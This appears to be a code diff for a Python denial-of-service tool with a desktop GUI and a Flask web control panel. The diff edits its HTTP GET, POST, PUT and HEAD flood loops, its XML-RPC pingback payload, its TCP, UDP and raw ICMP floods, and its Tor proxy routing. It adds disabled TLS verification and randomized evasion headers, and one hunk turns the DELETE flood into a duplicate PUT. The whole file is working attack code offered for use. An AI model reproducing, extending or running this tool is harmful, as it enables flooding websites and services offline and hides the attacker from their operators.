@@ -36,11 +36,14 @@ try:
   from concurrent.futures import Future, ThreadPoolExecutor
   from flask import Flask, jsonify, redirect, request, render_template as RTEMXP, send_from_directory as FSDIRX, session
   from itertools import cycle
+  from requests.adapters import HTTPAdapter
   from ssl import CERT_NONE as SSLCNX, create_default_context as SSLCDCX, SSLContext
   from sys import stdout
   from time import sleep
   from tkinter import font as tkfont, messagebox, ttk
   from urllib.parse import urlparse
+  from urllib3.poolmanager import PoolManager
+  from urllib3.util.retry import Retry
 
 except ModuleNotFoundError as e:
   print(f"Required Modules: {e} Is Not Installed. Please Run > pip3 install -r requirements.txt {e}")
@@ -298,10 +301,26 @@ xmlpayloadx = """
         </methodCall>
         """.format("".join(['<value><string>pingback.ping</string></value>'* 1000]))
 
-xmlrpcpathx = ["/xmlrpc.php", "/xmlrpc", "/rpc", "/api/xmlrpc"]
+xmlrpcdirx = ["/xmlrpc.php", "/xmlrpc", "/rpc", "/api/xmlrpc"]
+xmlrpcpathx = random.choice(xmlrpcdirx)
 
 endpoints = ["/api", "/json", "/data", "/upload", "/submit", "/"]
 endpoint = random.choice(endpoints)
+
+# SSL Context To Verify TLS Handshake
+
+class SSLAdapter(HTTPAdapter):
+    def __init__(self, sslctx=None, **kwargs):
+        self.sslctx = sslctx
+        super().__init__(**kwargs)
+
+    def init_poolmanager(self, connections, maxsize, block=False):
+        self.poolmanager = PoolManager(
+            num_pools=connections,
+            maxsize=maxsize,
+            block=block,
+            sslctx=self.sslctx
+        )
 
 # TOR PROXIES
 
@@ -325,7 +344,7 @@ def xtor(target):
     try:
         torsx = socks.socksocket()
         torsx.set_proxy(torsocks, toraddr, torport, rdns=True)
-        torsx.settimeout(5)
+        torsx.settimeout(3)
         torsx.connect((ipaddr, port))
         tornet = True
         logging.info(f"[ + TOR ]: Proxies Enabled.")
@@ -343,7 +362,7 @@ class AttackStatus:
         self.monitorx = False
         self.targetx = None
         self.methodx = None
-        self.rps = 0
+        self.countx = 0
 
 xstatus = AttackStatus()
 
@@ -386,8 +405,8 @@ class AttackMethods:
         ipaddr = socket.gethostbyname(host)
 
         with lockx:
-            xstatus.rps += 1
-            xcurrent = xstatus.rps
+            xstatus.countx += 1
+            xcurrent = xstatus.countx
             target = target if target else xstatus.targetx
             xmethod = xstatus.methodx
 
@@ -424,17 +443,26 @@ class AttackMethods:
             try:
                 while time.time() < countdownx and xstatus.startx:
                     try:
-                        xheaders = {
+                        tlsctx = SSLCDCX()
+                        tlsctx.check_hostname = False
+                        tlsctx.verify_mode = SSLCNX
+                        sessionx.mount("https://", SSLAdapter(sslctx=tlsctx))
+                        sessionx.mount("http://", HTTPAdapter())
+                        
+                        useragentx = {
                             "User-Agent": random.choice(xuseragent),
+                            "Content-Type": random.choice(xcontenttype),
                         }
 
-                        xheaders.update(xevasion())
+                        sessionx.headers.update(useragentx)
+
+                        xheaders = xevasion()
 
                         sessionx.get(
-                            target + f"?{''.join(random.choices(string.ascii_lowercase, k=10))}",
+                            target + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
+                            headers=xheaders,
                             timeout=3,
-                            verify=False,
-                            headers=xheaders
+                            verify=False
                         )
 
                         AttackMethods.updatethreads(target)
@@ -479,21 +507,29 @@ class AttackMethods:
             try:
                 while time.time() < countdownx and xstatus.startx:
                     try:
+                        tlsctx = SSLCDCX()
+                        tlsctx.check_hostname = False
+                        tlsctx.verify_mode = SSLCNX
+                        sessionx.mount("https://", SSLAdapter(sslctx=tlsctx))
+                        sessionx.mount("http://", HTTPAdapter())
+
                         body = '&'.join([f"{k}={v}" for k, v in xdata.items()])
 
-                        xheaders = {
+                        useragentx = {
                             "User-Agent": random.choice(xuseragent), 
                             "Content-Type": random.choice(xcontenttype),
                             "Content-Length": str(len(body))
                         }
 
-                        xheaders.update(xevasion())
+                        sessionx.headers.update(useragentx)
+
+                        xheaders = xevasion()
 
                         sessionx.get(
-                            target + endpoint,
+                            target + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
+                            headers=xheaders,
                             timeout=3,
-                            verify=False,
-                            headers=xheaders
+                            verify=False
                         )
 
                         AttackMethods.updatethreads(target)
@@ -538,21 +574,29 @@ class AttackMethods:
             try:
                 while time.time() < countdownx and xstatus.startx:
                     try:
+                        tlsctx = SSLCDCX()
+                        tlsctx.check_hostname = False
+                        tlsctx.verify_mode = SSLCNX
+                        sessionx.mount("https://", SSLAdapter(sslctx=tlsctx))
+                        sessionx.mount("http://", HTTPAdapter())
+
                         body = '&'.join([f"{k}={v}" for k, v in xdata.items()])
 
-                        xheaders = {
+                        useragentx = {
                             "User-Agent": random.choice(xuseragent), 
                             "Content-Type": random.choice(xcontenttype),
                             "Content-Length": str(len(body))
                         }
 
-                        xheaders.update(xevasion())
+                        sessionx.headers.update(useragentx)
+
+                        xheaders = xevasion()
 
                         sessionx.post(
-                            target + endpoint,
+                            target + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
                             data=xdata,
                             headers=xheaders,
-                            timeout=5,
+                            timeout=3,
                             verify=False
                         )
 
@@ -599,20 +643,28 @@ class AttackMethods:
             try:
                 while time.time() < countdownx and xstatus.startx:
                     try:
-                        xheaders = {
+                        tlsctx = SSLCDCX()
+                        tlsctx.check_hostname = False
+                        tlsctx.verify_mode = SSLCNX
+                        sessionx.mount("https://", SSLAdapter(sslctx=tlsctx))
+                        sessionx.mount("http://", HTTPAdapter())
+
+                        useragentx = {
                             "User-Agent": random.choice(xuseragent),
                             "Content-Type": "application/json",
                             "Content-Length": str(len(payloadx))
                         }
 
-                        xheaders.update(xevasion())
+                        sessionx.headers.update(useragentx)
+
+                        xheaders = xevasion()
 
                         sessionx.post(
-                            target + f"?{''.join(random.choices(string.ascii_lowercase, k=10))}",
-                            data=payloadx,
-                            timeout=5,
-                            verify=False,
-                            headers=xheaders
+                            target + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
+                            json=payloadx,
+                            headers=xheaders,
+                            timeout=3,
+                            verify=False
                         )
 
                         AttackMethods.updatethreads(target)
@@ -654,16 +706,26 @@ class AttackMethods:
             try:
                 while time.time() < countdownx and xstatus.startx:
                     try:
-                        xheaders = {
-                            "User-Agent": random.choice(xuseragent)
+                        tlsctx = SSLCDCX()
+                        tlsctx.check_hostname = False
+                        tlsctx.verify_mode = SSLCNX
+                        sessionx.mount("https://", SSLAdapter(sslctx=tlsctx))
+                        sessionx.mount("http://", HTTPAdapter())
+
+                        useragentx = {
+                            "User-Agent": random.choice(xuseragent),
+                            "Content-Type": random.choice(xcontenttype),
                         }
 
-                        xheaders.update(xevasion())
+                        sessionx.headers.update(useragentx)
+
+                        xheaders = xevasion()
 
                         sessionx.head(
-                            target,
+                            target + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
                             headers=xheaders,
-                            timeout=5,
+                            timeout=3,
+                            allow_redirects=True,
                             verify=False
                         )
 
@@ -706,17 +768,26 @@ class AttackMethods:
             try:
                 while time.time() < countdownx and xstatus.startx:
                     try:
-                        xheaders = {
-                            "User-Agent": random.choice(xuseragent)
+                        tlsctx = SSLCDCX()
+                        tlsctx.check_hostname = False
+                        tlsctx.verify_mode = SSLCNX
+                        sessionx.mount("https://", SSLAdapter(sslctx=tlsctx))
+                        sessionx.mount("http://", HTTPAdapter())
+
+                        useragentx = {
+                            "User-Agent": random.choice(xuseragent), 
                         }
 
-                        xheaders.update(xevasion())
+                        sessionx.headers.update(useragentx)
+
+                        xheaders = xevasion()
 
                         sessionx.put(
-                            target + f"?{''.join(random.choices(string.ascii_letters, k=10))}",
-                            headers=xheaders,
+                            target + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
                             data=xdata,
-                            timeout=5,
+                            headers=xheaders,
+                            timeout=3,
+                            allow_redirects=True,
                             verify=False
                         )
 
@@ -759,18 +830,29 @@ class AttackMethods:
             try:
                 while time.time() < countdownx and xstatus.startx:
                     try:
-                        xheaders = {
-                            "User-Agent": random.choice(xuseragent)
+                        tlsctx = SSLCDCX()
+                        tlsctx.check_hostname = False
+                        tlsctx.verify_mode = SSLCNX
+                        sessionx.mount("https://", SSLAdapter(sslctx=tlsctx))
+                        sessionx.mount("http://", HTTPAdapter())
+
+                        useragentx = {
+                            "User-Agent": random.choice(xuseragent), 
                         }
 
-                        xheaders.update(xevasion())
+                        sessionx.headers.update(useragentx)
 
-                        sessionx.delete(
-                            target + f"?{''.join(random.choices(string.ascii_letters, k=10))}",
+                        xheaders = xevasion()
+
+                        sessionx.put(
+                            target + f"?{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}",
+                            data=xdata,
                             headers=xheaders,
-                            timeout=5,
+                            timeout=3,
+                            allow_redirects=True,
                             verify=False
                         )
+
                         AttackMethods.updatethreads(target)
                     except Exception as e:
                         logging.error(f"[ ERROR ]: Attack Failed: {e}")
@@ -810,21 +892,29 @@ class AttackMethods:
             try:
                 while time.time() < countdownx and xstatus.startx:
                     try:
-                        xheaders = {
+                        tlsctx = SSLCDCX()
+                        tlsctx.check_hostname = False
+                        tlsctx.verify_mode = SSLCNX
+                        sessionx.mount("https://", SSLAdapter(sslctx=tlsctx))
+                        sessionx.mount("http://", HTTPAdapter())
+
+                        useragentx = {
                             "User-Agent": random.choice(xuseragent), 
-                            "Content-Type": "text/xml",
+                            "Content-Type": random.choice(xcontenttype),
                             "Content-Length": str(len(xmlpayloadx))
                         }
 
-                        xheaders.update(xevasion())
+                        sessionx.headers.update(useragentx)
+
+                        xheaders = xevasion()
 
                         for path in xmlrpcpathx:
                             sessionx.post(
                                 target.rstrip('/') + path, 
                                 data=xmlpayloadx, 
-                                timeout=5, 
-                                verify=False,
-                                headers=xheaders
+                                headers=xheaders,
+                                timeout=3,
+                                verify=False
                             )
 
                         AttackMethods.updatethreads(target)
@@ -870,8 +960,8 @@ class AttackMethods:
                 )
                 
                 dosx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                dosx.settimeout(5)
-                dosx.connect((ipaddr, port))
+                dosx.settimeout(3)
+                dosx.connect((host, port))
 
                 if port == 443:
                     sslcontextx = SSLContext(ssl.PROTOCOL_TLS_CLIENT)
@@ -946,7 +1036,7 @@ class AttackMethods:
         def createudpsockx():
             try:
                 dosx = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                dosx.settimeout(5)
+                dosx.settimeout(3)
                 datasizex = random.randint(512, 2048)
                 datax = ''.join(random.choices(string.ascii_letters + string.digits, k=datasizex)).encode('utf-8')
                 portx = random.choice(udpport)
@@ -1035,7 +1125,7 @@ class AttackMethods:
                 packetidx = os.getpid() & 0xFFFF
                 packet = createicmpdatax(packetidx)
                 dosx = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-                dosx.settimeout(5)
+                dosx.settimeout(3)
                 dosx.sendto(packet, (ipaddr, 0))
                 AttackMethods.updatethreads(target)
                 return dosx
@@ -1337,7 +1427,7 @@ class TOM7ARMEDGUI:
         with lockx:
             xstatus.monitorx = False
             xstatus.startx = True
-            xstatus.rps = 0
+            xstatus.countx = 0
             xstatus.targetx = target
             xstatus.methodx = method
         sleep(0.1)
@@ -1353,7 +1443,7 @@ class TOM7ARMEDGUI:
     def xmonupdate(self):
         try:
             with lockx:
-                xcurrent = xstatus.rps
+                xcurrent = xstatus.countx
             
             target = xstatus.targetx if xstatus.targetx else self.targetvarx.get()
             method = xstatus.methodx if xstatus.methodx else self.methodxvar.get()
@@ -1410,7 +1500,7 @@ class TOM7ARMEDGUI:
                 xstatus.startx = False
                 sleep(0.1)
 
-            finalattackx = xstatus.rps
+            finalattackx = xstatus.countx
             xtargetx = xstatus.targetx
             xmethodx = xstatus.methodx
             self.root.after(0, lambda: messagebox.showinfo(
@@ -1439,7 +1529,7 @@ def get_attack_status():
     with lockx:
         statusdatax = {
             "active": xstatus.startx,
-            "requests": xstatus.rps,
+            "requests": xstatus.countx,
             "target": xstatus.targetx,
             "method": xstatus.methodx,
             "consolemsgx": consolemsgx[-10:] if consolemsgx else []
@@ -1472,7 +1562,7 @@ def xattackweb():
             threads=session.get('threads', 0),
             method=session.get('method', 'N/A'),
             tor=session.get('tor', 'No'),
-            xcurrent=xstatus.rps
+            xcurrent=xstatus.countx
         ), 200
 
 
@@ -1510,7 +1600,7 @@ def xattackweb():
         xstatus.startx = True
         xstatus.targetx = target
         xstatus.methodx = method
-        xstatus.rps = 0
+        xstatus.countx = 0
         xcurrent = 0
 
     session['target'] = target
@@ -1591,7 +1681,7 @@ def stop_attack():
     with lockx:
         if xstatus.startx:
             xstatus.startx = False
-            finalxcurrent = xstatus.rps
+            finalxcurrent = xstatus.countx
             consolepanelmsg(f"Attack Stopped Manually At {finalxcurrent} Requests")
             return jsonify({"success": True, "message": "Attack Stopped", "finalxcurrent": finalxcurrent})
         else:
@@ -1601,7 +1691,7 @@ def stop_attack():
 def attack_summary():
     with lockx:
         return jsonify({
-            "total_requests": xstatus.rps,
+            "total_requests": xstatus.countx,
             "target": xstatus.targetx,
             "method": xstatus.methodx,
             "active": xstatus.startx
